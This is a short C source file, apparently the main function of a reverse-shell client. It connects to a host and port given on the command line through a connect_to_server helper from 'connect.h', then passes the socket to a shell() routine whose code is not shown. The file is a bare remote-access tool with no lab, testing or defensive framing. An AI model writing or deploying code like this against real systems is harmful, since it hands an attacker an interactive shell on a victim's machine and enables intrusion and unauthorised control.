#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>

#include "connect.h"

int main(int argc, char **argv){
    int sock;
    if(argc == 3)
        if((sock = connect_to_server(argv[1], atoi(argv[2]))) != EOF)
            shell(sock);
    return 0;
}
